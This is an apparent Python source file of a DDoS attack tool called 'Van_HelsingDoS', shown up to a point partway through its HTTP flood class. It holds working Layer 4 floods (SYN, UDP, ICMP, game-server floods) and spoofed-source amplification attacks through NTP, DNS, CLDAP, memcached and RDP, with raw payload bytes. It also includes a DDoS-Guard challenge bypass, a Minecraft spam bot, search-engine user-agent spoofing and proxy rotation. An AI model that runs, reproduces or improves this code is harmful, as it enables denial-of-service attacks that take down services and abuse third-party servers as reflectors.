#!/usr/bin/env python3
 
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from re import compile
from random import choice as randchoice, randint
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                    gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
import ssl
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4

# [OPTIMIZED] Ulimit (File Descriptor) Booster
try:
    import resource
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    if soft < 65535:
        # Try to set to Hard Limit or 65535
        target = min(hard, 65535)
        resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
except ImportError:
    pass # Windows/Non-Unix doesn't support resource module

from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, cookies
from yarl import URL
from base64 import b64encode

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("Van_HelsingDoS")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
# Enforce only TLSv1.2+ (defense-in-depth: also disable older protocols explicitly)
if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
# Disable insecure TLS versions for additional safety
if hasattr(ssl, "OP_NO_TLSv1"):
    ctx.options |= ssl.OP_NO_TLSv1
if hasattr(ssl, "OP_NO_TLSv1_1"):
    ctx.options |= ssl.OP_NO_TLSv1_1
# [OPTIMIZED] Browser-Like Ciphers (Chrome 120+)
ctx.set_ciphers(
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
    "DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384"
)

__version__: str = "2.4 SNAPSHOT"
__dir__: Path = Path(__file__).parent
__ip__: Any = None
tor2webs = [
            'onion.city',
            'onion.cab',
            'onion.direct',
            'onion.sh',
            'onion.link',
            'onion.ws',
            'onion.pet',
            'onion.rip',
            'onion.plus',
            'onion.top',
            'onion.si',
            'onion.ly',
            'onion.my',
            'onion.sh',
            'onion.lu',
            'onion.casa',
            'onion.com.de',
            'onion.foundation',
            'onion.rodeo',
            'onion.lat',
            'tor2web.org',
            'tor2web.fi',
            'tor2web.blutmagie.de',
            'tor2web.to',
            'tor2web.io',
            'tor2web.in',
            'tor2web.it',
            'tor2web.xyz',
            'tor2web.su',
            'darknet.to',
            's1.tor-gateways.de',
            's2.tor-gateways.de',
            's3.tor-gateways.de',
            's4.tor-gateways.de',
            's5.tor-gateways.de'
        ]

with open(__dir__ / "config.json") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def exit(*message):
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "SLOW_V2", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP", "WP_SEARCH", "XMLRPC_AMP", "POST_DYN"
    }

    LAYER4_AMP: Set[str] = {
        "MEM", "NTP", "DNS", "ARD",
        "CLDAP", "CHAR", "RDP"
    }

    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
                                "TS3", "MCPE", "ICMP", "OVH-UDP",
                                }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


search_engine_agents = [
    # ---------------- Google ----------------
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-News",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "AdsBot-Google-Mobile-Apps",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
    "Mediapartners-Google",
    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",

    # ---------------- Bing / Microsoft ----------------
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "BingPreview/1.0b",
    "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",

    # ---------------- Yahoo ----------------
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Yahoo! Slurp China",

    # ---------------- Yandex ----------------
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "YandexMobileBot/3.0 (+http://yandex.com/bots)",
    "YandexImages/3.0 (+http://yandex.com/bots)",
    "YandexVideo/3.0 (+http://yandex.com/bots)",
    "YandexNews/3.0 (+http://yandex.com/bots)",
    
    # ---------------- Baidu ----------------
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
    "Baiduspider-video (+http://www.baidu.com/search/spider.html)",

    # ---------------- DuckDuckGo ----------------
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",

    # ---------------- Applebot ----------------
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; "
    "+http://www.apple.com/go/applebot)",

    # ---------------- Facebook / Social ----------------
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Facebot/1.0",

    # ---------------- Twitter ----------------
    "Twitterbot/1.0",

    # ---------------- LinkedIn ----------------
    "LinkedInBot/1.0 (+https://www.linkedin.com/)",

    # ---------------- Pinterest ----------------
    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",

    # ---------------- Other Major Bots ----------------
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
    "CCBot/2.0 (+http://commoncrawl.org/faq/)",


    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)"
]




class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()
REQUESTS_SENT = Counter()
BYTES_SEND = Counter()
TOTAL_REQUESTS_SENT = Counter()
CONNECTIONS_SENT = Counter()


class Tools:
    IP = compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = compile('"protocol":(\\d+)')
    
    @staticmethod
    def get_random_indo_ip():
        # [NEW] Generate Indonesian Residential IPs (Telkomsel, Indihome, XL)
        ranges = [
            "114.124.{}.{}", "182.253.{}.{}", # Telkomsel
            "180.244.{}.{}", "125.160.{}.{}", # Indihome
            "112.215.{}.{}", # XL
            "139.192.{}.{}" # More Indihome
        ]
        chosen = randchoice(ranges)
        return chosen.format(randint(0, 255), randint(1, 254))
    
    @staticmethod
    def crawl(url_str):
        # [NEW] Active Reconnaissance - Scrape for Real Paths
        try:
            from urllib.parse import urlparse
            import urllib.request
            import re
            
            p = urlparse(url_str)
            base = f"{p.scheme}://{p.netloc}"
            
            # Simple GET request
            req = urllib.request.Request(url_str, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                html = response.read().decode('utf-8', errors='ignore')
                
            # Regex to find hrefs
            links = re.findall(r'href=["\'](/?.*?)["\']', html)
            valid_paths = []
            for link in links:
                if link.startswith('http'):
                    if p.netloc in link: # Internal full URL
                        valid_paths.append(link.replace(base, ""))
                elif link.startswith('/'): # Relative Path
                    valid_paths.append(link)
            
            # Unique Only
            return list(set(valid_paths))
        except Exception:
            return []

    @staticmethod
    def human_format(num: int, ending: str = "B") -> str:
        num = float('{:.3g}'.format(num))
        magnitude = 0
        while abs(num) >= 1024:
            magnitude += 1
            num /= 1024.0
        return '{}{}{}'.format('{:f}'.format(num).rstrip('0').rstrip('.'),
                               ['', 'K', 'M', 'G', 'T', 'P'][magnitude], ending)

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT, TOTAL_REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        TOTAL_REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT, TOTAL_REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        TOTAL_REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

        return False

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack('>q', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
                                               0x01 if protocol >= 385 else \
                                               0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
                                               0x10 if protocol >= 712 else \
                                               0x0F if protocol >= 471 else \
                                               0x10 if protocol >= 464 else \
                                               0x0E if protocol >= 389 else \
                                               0x0C if protocol >= 386 else \
                                               0x0B if protocol >= 345 else \
                                               0x0A if protocol >= 343 else \
                                               0x0B if protocol >= 336 else \
                                               0x0C if protocol >= 318 else \
                                               0x0B if protocol >= 107 else \
                                               0x00),
                              Minecraft.long(num_id) if protocol >= 339 else \
                              Minecraft.varint(num_id))

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
                                               0x03 if protocol >= 464 else \
                                               0x02 if protocol >= 389 else \
                                               0x01 if protocol >= 343 else \
                                               0x02 if protocol >= 336 else \
                                               0x03 if protocol >= 318 else \
                                               0x02 if protocol >= 107 else \
                                               0x01),
                              Minecraft.data(message.encode()))


# noinspection PyBroadException,PyUnusedLocal
class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None,
                 protocolid: int = 74):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "VSE": self.VSE,
            "TS3": self.TS3,
            "MCPE": self.MCPE,
            "FIVEM": self.FIVEM,
            "FIVEM-TOKEN": self.FIVEMTOKEN,
            "OVH-UDP": self.OVHUDP, 
            "MINECRAFT": self.MINECRAFT,
            "CPS": self.CPS,
            "CONNECTION": self.CONNECTION,
            "MCBOT": self.MCBOT,
        }

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    def open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        if self._proxy_cycle:
            s = next(self._proxy_cycle).open_socket(
                conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

    def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1024)):
                continue
        Tools.safe_close(s)

    def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b'\x00')

        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, handshake):
                Tools.send(s, ping)
        Tools.safe_close(s)

    def CPS(self) -> None:
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            REQUESTS_SENT += 1
        Tools.safe_close(s)

    def alive_connection(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while s.recv(1):
                continue
        Tools.safe_close(s)

    def CONNECTION(self) -> None:
        global REQUESTS_SENT
        with suppress(Exception):
            Thread(target=self.alive_connection).start()
            REQUESTS_SENT += 1

    def UDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target):
                continue
        Tools.safe_close(s)

    def OVHUDP(self) -> None:
        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while True:
                for payload in self._generate_ovhudp():
                    Tools.sendto(s, payload, self._target)
        Tools.safe_close(s)

    def ICMP(self) -> None:
        payload = self._genrate_icmp()
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def SYN(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, self._genrate_syn(), self._target):
                continue
        Tools.safe_close(s)

    def AMP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, *next(self._amp_payloads)):
                continue
        Tools.safe_close(s)

    def MCBOT(self) -> None:
        s = None

        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                        self.protocolid,
                                                        2,
                                                        ProxyTools.Random.rand_ipv4(),
                                                        uuid4()))
            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
            password = b64encode(username.encode()).decode()[:8].title()
            Tools.send(s, Minecraft.login(self.protocolid, username))
            
            sleep(1.5)

            Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))

            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)

        Tools.safe_close(s)

    def VSE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                   b'\x20\x51\x75\x65\x72\x79\x00')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEMTOKEN(self) -> None:
        global BYTES_SEND, REQUESTS_SENT

        # Generete token and guid
        token = str(uuid4())
        steamid_min = 76561197960265728
        steamid_max = 76561199999999999
        guid = str(randint(steamid_min, steamid_max))

        # Build Payload
        payload_str = f"token={token}&guid={guid}"
        payload = payload_str.encode('utf-8')

        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEM(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def TS3(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def MCPE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                   b'\x73')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def _generate_ovhudp(self) -> List[bytes]:
        packets = []

        methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
        paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0', '\\0\\0\\0\\0\\0\\0\\', '/', '/null', '/%00%00%00%00']

        for _ in range(randint(2, 4)):
            ip = IP()
            ip.set_ip_src(__ip__)
            ip.set_ip_dst(self._target[0])

            udp = UDP()
            udp.set_uh_sport(randint(1024, 65535))
            udp.set_uh_dport(self._target[1])

            payload_size = randint(1024, 2048)
            random_part = randbytes(payload_size).decode("latin1", "ignore")

            method = randchoice(methods)
            path = randchoice(paths)

            payload_str = (
                f"{method} {path}{random_part} HTTP/1.1\n"
                f"Host: {self._target[0]}:{self._target[1]}\r\n\r\n"
            )

            payload = payload_str.encode("latin1", "ignore")

            udp.contains(Data(payload))
            ip.contains(udp)

            packets.append(ip.get_packet())

        return packets

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp: ICMP = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
            elif name == "ICMP":
                self.SENT_FLOOD = self.ICMP
                self._target = (self._target[0], 0)
            elif name == "RDP":
                self._amp_payload = (
                    b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                    3389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CLDAP":
                self._amp_payload = (
                    b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                    b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
                    389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "MEM":
                self._amp_payload = (
                    b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CHAR":
                self._amp_payload = (b'\x01', 19)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "ARD":
                self._amp_payload = (b'\x00\x14\x00\x00', 3283)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "NTP":
                self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "DNS":
                self._amp_payload = (
                    b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                    b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
                    53)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())


# noinspection PyBroadException,PyUnusedLocal
class HttpFlood(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self,
                 thread_id: int,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))
        
        # [NEW] Crawler Integration placeholder
        self.crawled_paths = []
        
        # [NEW] Crawler Integration placeholder
        # The main loop will inject crawled_paths into the class instance if found
        self.crawled_paths = []

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC_AMP,
            "BOT": self.BOT,
            "APACHE": self.APACHE,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "STOMP": self.STOMP,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "TOR": self.TOR,
            "EVEN": self.EVEN,
            "DOWNLOADER": self.DOWNLOADER,
            "BOMB": self.BOMB,
            "PPS": self.PPS,
            "KILLER": self.KILLER,
            "WP_SEARCH": self.WP_SEARCH,
            "SLOW_V2": self.SLOW_V2,
            "XMLRPC_AMP": self.XMLRPC_AMP,
            "POST_DYN": self.POST_DYN,
        }

        if not referers:
            referers: List[str] = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u="
            ]
        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            # [OPTIMIZED] Modern User-Agents (2025 Era)
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:122.0) Gecko/20100101 Firefox/122.0',
